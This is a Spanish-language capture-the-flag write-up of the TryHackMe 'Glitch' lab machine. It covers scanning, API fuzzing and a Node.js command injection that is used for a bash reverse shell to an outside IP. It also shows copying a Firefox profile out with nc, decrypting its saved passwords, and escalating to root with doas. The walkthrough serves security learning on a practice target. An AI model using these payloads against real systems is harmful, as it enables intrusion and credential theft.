---
layout: single
title: Glitch final
excerpt: "Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?"
date: 2022-05-06
classes: wide
header:
  teaser: /assets/images/thm-writeup-glitch/glitch_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - Web
  - Javascript
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-glitch/glitch_logo.png)

[Link](https://tryhackme.com/room/glitch "Glitch")

This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. Feedback is always appreciated.

---

## 1. Fase de reconocimiento

- Para conocer a que nos estamos enfrentando lanzamos el siguiente comando:

```css
ping -c 1 {ip}
```

![logo](/assets/images/thm-writeup-glitch/glitch_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los **_65535_** puertos de red el cual guardamos en un archivo en formato **_nmap_** con el siguiente comando:

```css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
```

![nmap_allports](/assets/images/thm-writeup-glitch/glitch_nmap_allports.png)

---

- De acuerdo con el escaneo anterior, se encuentran el siguiente puerto abierto; 80 (htp)

- Escaeno de vulnerabilidades sobre el 80:

```css
nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
```

![nmap_allports](/assets/images/thm-writeup-glitch/glitch_nmap_vuln.png)

---

- Whatweb nos da la siguiente información:

```css
whatweb {ip}
```

![nmap_allports](/assets/images/thm-writeup-glitch/glitch_whatweb.png)

---

- Revisión de la URL **_<http://10.10.24.23>_**:

![URL] (/assets/images/thm-writeup-glitch/glitch_nmap_vuln.png)

---

- Buscando el la ruta **_robots.txt_**, nos muestra lo siguiente:

![URL](/assets/images/thm-writeup-glitch/glitch_robots.png)

- Revisando la petición anteriro en **burpsuite**:

![URL](/assets/images/thm-writeup-glitch/glitch_burp_get.png)

---

## 2.1 WFUZ

- Escaeno de subdominios con wfuzz:

```css
 wfuzz --hc=404,273 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.24.13/FUZZ/

```

![wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz.png)

- Con el anterior escaner encotramos las páginas  **secret - img - js**

---

## 2.2 Gobuster

- Escaeno de subdominios con gobuster

```css
gobuster -w /usr/share/dirb/wordlists/common.txt dir -u http://10.10.24.13 -x html,php,txt -k   
```

- Con el anterior escaner encotramos las páginas  **secret - img - js**

## 2.3 Burpsuite

- Realizamos la del home captura mediante burpsuite y nos encotramos con lo siguiente

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_home.png)

---

- Con la información obtenida en **gobuster** analizamos la solicitud de la ruta **secret**, la cual nos muestra un script con la siguiente ruta **/api/access**:

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_secret.png)

- Realizamos la captura sobre la ruta de la captura anterior **/api/access/** y aca nos encontramos un token codificado en base 64, el cual procedemos a decodificar y con esta damos respuesta a la primera pregunta:

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_token.png)

---

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_decodifica.png)

---

### 2.4 WFUZZ - 2

- Realizamos otro escaneo sobre la ruta **api**, la cual nos entrega las siguientes rutas: **access, items, Access**:

![Wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz_2.png)

- Con la información obtenida y sabiendo que recibe las respuestas vía **post**, procedemos a enviar el siguiente escaneo:

```css
# wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hh=45 http://10.10.108.10/api/items?FUZZ=oops 
```

![Wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz_3.png)



### 2.5 Burpsuite - 2

- De acuerdo con las rutas encontradas con el escaneo anterior y después de revisar diferentes posibilidades, modificamos el tipo de petición a **post** y nos encontramos con el mensaje: **"message":"there_is_a_glitch_in_the_matrix"**:

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_post.png)

- Con base en la respuesta de la petición anterior se puede inferir que podemos inyectar código, procedemos a lanzar la siguiente petición para corroborar lo anterior: **POST /api/items?cmd=id HTTP/1.1**

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_post_id.png)


### 3 Exploit

- De acuerdo con la información obtenida en diferentes páginas de como executar una **Nodejs - simple reverse shell**, procedemos a ejecutarla desde **burpsuite**, antes de esto debemos ponernos en escucha por el puerto configurado **4444**.

![nc](/assets/images/thm-writeup-glitch/glitch_nc.png)

---

```css
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.9.0.68/4444+0>%261"') HTTP/1.1
```

![burp](/assets/images/thm-writeup-glitch/glitch_burp_exploit.png)

---

### 3.1 TAR Comprimir

- Investigando los archivos listados encontramos la carpeta **.firefox** la cual procedemos a comprimir con **tar** y a descargar con **nc**, con los siguientes comandos:

```css
user@ubuntu:~$ tar -czvf .firefox
user@ubuntu:~$ ls
firefox.tar.gz  user.txt

```

### 3.2 Compartir archivo con nc

```css
[Terminal atacante]
─# nc -nlvp 3333 > firefox.tar.gz
listening on [any] 3333 ...
connect to [10.9.0.68] from (UNKNOWN) [10.10.24.13] 60530
─# ls
exp.py  firefox.tar.gz

[Terminal target]
user@ubuntu:~$ nc -nv 10.9.0.68 3333 < firefox.tar.gz
Connection to 10.9.0.68 3333 port [tcp/*] succeeded!
```

### 3.3 TAR descomprimir

```css
└─# tar xvzf firefox.tar.gz 
.firefox/
.firefox/profiles.ini
.firefox/Crash Reports/
.firefox/Crash Reports/events/
.firefox/Crash Reports/InstallTime20200720193547
.firefox/b5w4643p.default-release/
.firefox/b5w4643p.default-release/key4.db
.firefox/b5w4643p.default-release/cookies.sqlite
.firefox/b5w4643p.default-release/prefs.js
...
```

### Exploit para descifar las contraseñas

- Descargamos el exploit desde la siguiente página <https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py> lo guardamos con el nombre **exp.py**, o ejecutamos con el siguiente comando y marcamos la opción **2** y de está manera obtenemos un usuario y contraseña:

```css
─# python3 exp.py .firefox 
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
2

Website:   https://glitch.thm
Username: 'v??????'
Password: 'l??????'

```

- Ingresamos con el usuario y contraseña encontrados en el punto anterior:

```css
user@ubuntu:~$ su v0id
su v0id
Password: l??????
v0id@ubuntu:/home/user$ 

```
---

### Root

- Con el siguiente comando procedemos a escanerar los binarios que pueden ser explotados y **doas** nos permite 

```css
root@ubuntu:~# find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas
root@ubuntu:~# 

```

---

- Ejecutamos el binario **doas** y podemos obtener acceso como root:

```css
v0id@ubuntu:/home/user$  doas -u root /bin/bash
 doas -u root /bin/bash
Password: l???????

root@ubuntu:/home/user# cd /root
cd /root
root@ubuntu:~# cat root.txt
cat root.txt
THM{d????????}

```

### Fuentes

Writeup:

<https://www.aldeid.com/wiki/TryHackMe-GLITCH>
